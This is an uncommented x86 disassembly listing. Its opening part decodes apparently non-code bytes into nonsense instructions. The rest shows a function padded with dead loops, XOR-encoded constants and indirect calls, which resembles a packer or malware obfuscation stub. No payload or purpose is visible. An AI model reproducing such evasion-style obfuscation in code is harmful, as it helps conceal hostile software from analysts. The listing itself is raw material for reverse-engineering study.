  414c7e:	mov    WORD PTR [eax+esi*2],ds
  414c81:	mov    bh,bh
  414c83:	push   cs
  414c84:	pop    edx
  414c85:	les    ebp,FWORD PTR [esi+0x7c]
  414c88:	mov    ebx,0x4ca1a85c
  414c8d:	in     al,0x99
  414c8f:	adc    eax,0xfd8640d3
  414c94:	(bad)  [edx-0x97627ae]
  414c9a:	int3   
  414c9b:	add    al,0xfe
  414c9d:	cli    
  414c9e:	push   eax
  414c9f:	rcr    DWORD PTR [edx+0x25],1
  414ca2:	mov    ebx,0xf47af7a3
  414ca7:	cdq    
  414ca8:	das    
  414ca9:	xlat   BYTE PTR ds:[ebx]
  414caa:	adc    eax,DWORD PTR [edx+ecx*1+0x37618835]
  414cb1:	and    BYTE PTR [eax+0x40],cl
  414cb4:	mov    al,0xb1
  414cb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cb7:	add    DWORD PTR [ebx-0x17],0x31061bcf
  414cbe:	pop    eax
  414cbf:	loopne 0x414d31
  414cc1:	push   esp
  414cc2:	dec    eax
  414cc3:	lds    edx,FWORD PTR ds:0xc685d758
  414cc9:	daa    
  414cca:	mov    ebx,?
  414ccc:	js     0x414c8d
  414cce:	lods   al,BYTE PTR ds:[esi]
  414ccf:	inc    edi
  414cd0:	pop    ds
  414cd1:	cs push ss
  414cd3:	test   BYTE PTR [ebx-0x36],0x2e
  414cd7:	(bad)  
  414cd8:	xchg   ecx,eax
  414cd9:	mov    edx,0xa52654cb
  414cde:	adc    BYTE PTR [edx-0x55],0x7
  414ce2:	dec    ebp
  414ce3:	sub    al,0xd6
  414ce5:	mov    eax,0x1e2f4c41
  414cea:	sbb    edi,DWORD PTR [ecx]
  414cec:	cli    
  414ced:	mov    bl,0xc5
  414cef:	sbb    eax,0xf6b525c
  414cf4:	push   ecx
  414cf5:	rdtsc  
  414cf7:	retf   
  414cf8:	jge    0x414d3b
  414cfa:	sub    cl,BYTE PTR [ecx+0x144ff4d0]
  414d00:	push   ss
  414d01:	jp     0x414d65
  414d03:	sbb    BYTE PTR [esp+eax*2-0x37e4432d],dh
  414d0a:	or     dl,0x5f
  414d0d:	call   0xceb95271
  414d12:	mov    ds:0x8697ee38,eax
  414d17:	fistp  DWORD PTR [edi+0x3]
  414d1a:	xor    dl,dh
  414d1c:	mov    al,0x34
  414d1e:	push   edx
  414d1f:	sub    al,0xba
  414d21:	test   eax,0xe9e6f80f
  414d26:	std    
  414d27:	mov    bh,0x24
  414d29:	jbe    0x414d2b
  414d2b:	inc    edx
  414d2c:	call   0xc14fadc0
  414d31:	rcl    BYTE PTR [eax],1
  414d33:	lods   al,BYTE PTR ds:[esi]
  414d34:	xor    ebx,DWORD PTR [esi]
  414d36:	sbb    BYTE PTR [ebx+0x50595364],dl
  414d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d3e:	pushf  
  414d3f:	sub    al,0xe
  414d41:	scas   al,BYTE PTR es:[edi]
  414d42:	lods   al,BYTE PTR ds:[esi]
  414d43:	adc    eax,0x1cbe4bac
  414d48:	std    
  414d49:	pop    esi
  414d4a:	mov    BYTE PTR [esi+0x756603d8],0x35
  414d51:	(bad)  
  414d54:	xor    al,0xc
  414d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d58:	cmp    DWORD PTR [ebp+ebp*1+0x73],0xfffffff2
  414d5d:	and    BYTE PTR [ecx],ch
  414d5f:	jmp    0xbef5:0x91584a6d
  414d66:	in     eax,dx
  414d67:	stc    
  414d68:	xor    DWORD PTR [edi],ebx
  414d6a:	imul   esp,DWORD PTR [eax],0x55
  414d6d:	push   cs
  414d6e:	pop    ebx
  414d6f:	jmp    0x2cf2:0x6a3390df
  414d76:	jb     0x414d26
  414d78:	inc    eax
  414d79:	inc    edi
  414d7a:	xchg   BYTE PTR [eax],bh
  414d7c:	fimul  DWORD PTR [esi+0x76]
  414d7f:	cmp    eax,0x28d34fc2
  414d84:	sbb    eax,0x2edf528c
  414d89:	pop    eax
  414d8a:	into   
  414d8b:	sub    DWORD PTR [ecx],eax
  414d8d:	je     0x414d5a
  414d8f:	mov    DWORD PTR [eax+0x60],ebp
  414d92:	imul   esp
  414d94:	jb     0x414dcd
  414d96:	add    cl,BYTE PTR [edi]
  414d98:	daa    
  414d99:	fcom   st(0)
  414d9b:	jno    0x414dd3
  414d9d:	push   0x52
  414d9f:	add    ch,dh
  414da1:	jmp    0xd1a0:0x202cb6cc
  414da8:	push   0x63ca9539
  414dad:	stos   DWORD PTR es:[edi],eax
  414dae:	outs   dx,BYTE PTR ds:[esi]
  414daf:	add    BYTE PTR [edx-0x74b051a7],ch
  414db5:	sub    cl,bl
  414db7:	bound  edi,QWORD PTR ds:0xbd3c0bfa
  414dbd:	jecxz  0x414d88
  414dbf:	mov    bh,0xc5
  414dc1:	pop    ebx
  414dc2:	iret   
  414dc3:	out    dx,eax
  414dc4:	aaa    
  414dc5:	mov    ebp,ebx
  414dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dc8:	in     al,dx
  414dc9:	jg     0x414dc5
  414dcb:	pusha  
  414dcc:	dec    ebp
  414dcd:	adc    BYTE PTR [ecx+0x514ccf3f],dh
  414dd3:	frstor [esi+0x7d]
  414dd6:	mul    BYTE PTR [eax+0x7000e8d]
  414ddc:	dec    esp
  414ddd:	inc    edi
  414dde:	clc    
  414ddf:	cmp    BYTE PTR [ecx-0x37e129b8],0xa2
  414de6:	fdivrp st(0),st
  414de8:	cwde   
  414de9:	in     al,dx
  414dea:	mov    ch,0xbd
  414dec:	sub    al,0x7b
  414dee:	popf   
  414def:	xchg   DWORD PTR [edx-0x3a73d073],ecx
  414df5:	adc    BYTE PTR [edi+0x30],ch
  414df8:	jl     0x414de5
  414dfa:	xor    eax,0x3db18200
  414dff:	mov    fs,esi
  414e01:	mov    esp,0x3263f1da
  414e06:	jp     0x414ddd
  414e08:	ds adc eax,0x66d9f780
  414e0e:	mov    cl,0xc3
  414e10:	sahf   
  414e11:	inc    ecx
  414e12:	add    BYTE PTR [ecx],al
  414e14:	(bad)  
  414e15:	mov    eax,ds:0x55911b23
  414e1a:	sub    eax,0x40e3bc42
  414e1f:	mov    WORD PTR [ecx],fs
  414e21:	test   al,0x96
  414e23:	xchg   edi,eax
  414e24:	xor    BYTE PTR [esi-0x79f0bf61],cl
  414e2a:	data16 lods al,BYTE PTR ds:[esi]
  414e2c:	(bad)  
  414e2d:	call   FWORD PTR [ebx+0x5f]
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a7f5
  414e44:	xor    DWORD PTR ds:0x42a771,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7b9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a841,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a841
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a841,eax
  414e70:	cmp    DWORD PTR ds:0x42a841,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a841,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a84d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a801
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a7f9,0x42a831
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a801,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a835,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a775
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a845,0x42a765
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7b1,0x42a841
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a801,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a769,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a7fd,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a7fd
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a7fd,edi
  414f60:	cmp    DWORD PTR ds:0x42a7fd,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a7fd,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a809
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a7fd,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a7fd
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a7fd,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7b5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7c9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a76d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a845,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a849,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7b9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a805,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a845,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a849,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a849
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a849,ecx
  415032:	cmp    DWORD PTR ds:0x42a849,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a849,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a871
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a7f1,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a885,0x42a7b5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7c1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7c5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a879,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a879
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a879,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a879,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a879,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a83d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a84d
  4150eb:	mov    DWORD PTR ds:0x42a83d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7b1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a7f1
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a875,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a875
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a875,ecx
  415120:	cmp    DWORD PTR ds:0x42a875,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a875,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a75d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a75d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a75d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a75d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a99f
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a75d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a75d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a75d,ecx
  415190:	cmp    DWORD PTR ds:0x42a75d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a781
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7c1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7c1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7c1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7c1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7c1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7c1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7c1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7c1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7c9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7c9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7c9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7c9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7c9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a775
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7c9,0x42a881
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a871,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a841,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a839,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a765,0x42a87d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a83d,0x42a759
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7cd,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7cd
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7cd,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7cd,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7cd,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a849
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a781,0x10
  415329:	cmp    DWORD PTR ds:0x42a781,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a781,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a781,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a781
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a781,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a781
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a781,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a7f1,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a7f1
  415393:	inc    eax
  415394:	mov    ds:0x42a7f1,eax
  415399:	cmp    DWORD PTR ds:0x42a7f1,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a7f1,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a759
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7bd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a831,0x0
  4153ed:	mov    eax,ds:0x42a831
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a831,eax
  4153f8:	cmp    DWORD PTR ds:0x42a831,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a932
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a831,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a831
  41542b:	inc    eax
  41542c:	mov    ds:0x42a831,eax
  415431:	cmp    DWORD PTR ds:0x42a831,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a761,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a88d,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a88d,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a88d,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a769
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a88d,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a88d
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a88d,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a88d
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a88d,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7b9
  4154c7:	and    edx,DWORD PTR ds:0x42a84d
  4154cd:	mov    DWORD PTR ds:0x42a7b9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a781,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a835,0x42a7f1
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a835,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7c5,0x42a805
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a7f5,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a761,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7bd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7bd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7bd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7bd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a845
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7bd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a87d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a87d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a87d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a87d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a87d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
